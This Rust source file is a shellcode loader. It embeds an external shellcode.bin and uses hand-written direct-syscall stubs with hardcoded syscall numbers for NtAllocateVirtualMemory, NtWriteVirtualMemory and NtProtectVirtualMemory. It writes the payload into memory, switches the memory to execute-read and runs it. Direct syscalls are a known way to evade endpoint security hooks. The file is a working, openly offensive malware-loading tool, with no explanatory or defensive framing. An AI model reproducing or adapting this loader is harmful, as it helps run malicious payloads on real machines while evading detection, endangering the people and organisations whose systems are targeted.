#![allow(non_upper_case_globals)]

use std::{arch::global_asm, ffi::c_void, ptr::null_mut};

use ntapi::ntmmapi::NtProtectVirtualMemory;

const SHELLCODE: &[u8] = include_bytes!("../shellcode.bin");

pub const NtCurrentProcess: *mut c_void = -1isize as *mut c_void;
pub const MEM_COMMIT: u32 = 4096u32;
pub const MEM_RESERVE: u32 = 8192u32;
pub const PAGE_READWRITE: u32 = 4u32;
pub const PAGE_EXECUTE_READ: u32 = 32u32;

unsafe extern "win64" {
    fn Sys_NtAllocateVirtualMemory(
        ProcessHandle: *mut c_void,
        BaseAddress: *mut *mut c_void,
        ZeroBits: usize,
        RegionSize: *mut usize,
        AllocationType: u32,
        Protect: u32,
    ) -> i32;
    fn Sys_NtWriteVirtualMemory(
        ProcessHandle: *mut c_void,
        BaseAddress: *mut c_void,
        Buffer: *mut c_void,
        BufferSize: usize,
        NumberOfBytesWritten: *mut usize,
    ) -> i32;
    fn Sys_NtProtectVirtualMemory(
        ProcessHandle: *mut c_void,
        BaseAddress: *mut *mut c_void,
        RegionSize: *mut usize,
        NewProtect: u32,
        OldProtect: *mut u32,
    ) -> i32;
}

global_asm!(
    "
    .data
    SSN: .word 0

    .section .text
    .code64

    Sys_NtAllocateVirtualMemory:
        mov r10, rcx
        mov rax, 0x18
        syscall
        ret
    
    Sys_NtWriteVirtualMemory:
        mov r10, rcx
        mov rax, 0x3A
        syscall
        ret

    Sys_NtProtectVirtualMemory:
        mov r10, rcx
        mov rax, 0x50
        syscall
        ret
    "
);

type ShellcodeFn = unsafe extern "C" fn() -> ();

fn main() {
    unsafe {
        let mut base_address: *mut _ = null_mut();
        let mut size = SHELLCODE.len();
        let status = Sys_NtAllocateVirtualMemory(
            NtCurrentProcess,
            &mut base_address,
            0,
            &mut size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if status != 0 {
            println!("[-] Failed to allocate memory: 0x{:X}", status);
            return;
        }

        println!("[+] Allocated {} bytes at {:p}", size, base_address);

        let mut bytes_written = 0;
        let status = Sys_NtWriteVirtualMemory(
            NtCurrentProcess,
            base_address,
            SHELLCODE.as_ptr() as *mut c_void,
            SHELLCODE.len(),
            &mut bytes_written,
        );

        if status != 0 {
            println!("[-] Failed to write shellcode: 0x{:X}", status);
            return;
        }

        println!("[+] Wrote {} bytes of shellcode", bytes_written);

        let mut old_protect: u32 = 0;
        let status = Sys_NtProtectVirtualMemory(
            NtCurrentProcess,
            &mut base_address,
            &mut size,
            PAGE_EXECUTE_READ,
            &mut old_protect,
        );

        if status != 0 {
            println!("[-] Failed to change memory protection: 0x{:X}", status);
            return;
        }

        let shellcode_fn: ShellcodeFn = std::mem::transmute(base_address);
        println!("[+] Executing shellcode...");
        shellcode_fn();

        return;
    }
}
